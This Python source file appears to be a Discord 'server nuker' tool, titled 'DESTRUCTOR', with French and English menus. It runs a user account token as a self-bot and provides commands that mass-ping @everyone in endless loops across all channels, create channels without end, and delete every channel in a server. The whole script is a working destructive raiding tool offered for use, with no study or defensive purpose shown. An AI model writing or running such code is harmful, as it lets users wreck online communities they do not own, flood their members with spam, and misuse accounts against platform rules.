from time import sleep
import discord
from discord.ext import commands
from tkinter import *
import os
from turtle import color
import ctypes
from time import sleep


# Menu

os.system("color 5")
ctypes.windll.kernel32.SetConsoleTitleW("/!\ ")
print("\n")
print("                                     █▀▀▄ █▀▀ █▀▀ ▀▀█▀▀ █▀▀█ █░░█ █▀▀ ▀▀█▀▀ █▀▀█ █▀▀█ ")
print("                                     █░░█ █▀▀ ▀▀█ ░░█░░ █▄▄▀ █░░█ █░░ ░░█░░ █░░█ █▄▄▀ ")
print("                                     ▀▀▀░ ▀▀▀ ▀▀▀ ░░▀░░ ▀░▀▀ ░▀▀▀ ▀▀▀ ░░▀░░ ▀▀▀▀ ▀░▀▀ ")
print("                                     ________________________________________________")
print("\n\n\n")

# Définitions des bases pour le programme



# Programme


print(" 1 | FR")
print(" 2 | EN")
print("\n")
language = str(input(" Language > "))


if language == "2":
    print("___________________________________________________________________")
    print("\n")
    token = str(input("Insert the token here > "))
    message = str(input("Insert the spam message here > "))
    channels_name = str(input("Insert the channels name here > "))
    prefix = str(input("Insert your commands prefix > "))

    client = commands.Bot(command_prefix=prefix, self_bot=True)
    client.remove_command("help")

        

    @client.event
    async def on_connect():
        print("\n")
        print("___________________________________________________________________")
        print("\n")
        print(f"Connecting to {token}")
        sleep(1)
        print("\n")
        print("___________________________________________________________________")
        print("\n")
        print(f"The spamming message have been set to {message}")
        print(f"The channel spamming message have been set to {channels_name}")
        sleep(1)

        print("\n\n")
        print(" spam | Spam message \n ccr | Spam channels \n cdel | Delete all channels")
        print("\n\n")
        print(" You can use the commands on top using the chat, Ignore the errors bellow")
        print("__________________________________________________________________________")
        print("\n")

    @client.command(pass_context=True)
    async def ccr(ctx):
        guild = ctx.message.guild
        await ctx.message.delete()
        for i in range(1):
            await guild.create_text_channel(f"{channels_name}")
        while True:
            for channel in guild.text_channels:
                for i in range(500):
                    await guild.create_text_channel(f"{channels_name}")

    @client.command(pass_context=True)
    async def cdel(ctx):
        await ctx.message.delete()

        for channel in list(ctx.message.guild.channels):
            try:
                await channel.delete()
            except:
                pass

    @client.command(pass_context=True)
    async def spam(ctx):
        guild = ctx.message.guild
        await ctx.message.delete()
        for i in range(2):
            while True:
                for channel in guild.text_channels:
                    await channel.send(f"{message} @everyone")

    
    client.run(token, bot=False)

if language == "1":
    print("___________________________________________________________________")
    print("\n")
    token = str(input("Inserez le token ici > "))
    message = str(input("Inserez le message de spam > "))
    channels_name = str(input("Inserez le nom des salons > "))
    prefix = str(input("Inserez votre prefix pour les commandes > "))

    client = commands.Bot(command_prefix=prefix, self_bot=True)
    client.remove_command("help")

        

    @client.event
    async def on_connect():
        print("\n")
        print("___________________________________________________________________")
        print("\n")
        print(f"Connexion à {token}")
        sleep(1)
        print("\n")
        print("___________________________________________________________________")
        print("\n")
        print(f"Le message de spam a été définis en {message}")
        print(f"Le message des salons ont été définis en {channels_name}")
        sleep(1)

        print("\n\n")
        print(" spam | Spam de message \n ccr | Spam de salons \n cdel | Supprimer tous les salons")

        print("\n\n")
        print(" Vous pouvez utiliser les commands qui sont marqué au dessus en utilisant le chat")
        print("_____________________________________________________________________________________")
        print("\n")

    @client.command(pass_context=True)
    async def ccr(ctx):
        guild = ctx.message.guild
        await ctx.message.delete()
        for i in range(1):
            await guild.create_text_channel(f"{channels_name}")
        while True:
            for channel in guild.text_channels:
                for i in range(500):
                    await guild.create_text_channel(f"{channels_name}")

    @client.command(pass_context=True)
    async def cdel(ctx):
        await ctx.message.delete()

        for channel in list(ctx.message.guild.channels):
            try:
                await channel.delete()
            except:
                pass

    @client.command(pass_context=True)
    async def spam(ctx):
        guild = ctx.message.guild
        await ctx.message.delete()
        for i in range(2):
            while True:
                for channel in guild.text_channels:
                    await channel.send(f"{message} @everyone")

    
    client.run(token, bot=False)

else:
    print("___________________________________________________________________")
    print("\n\n Une erreur est survenue")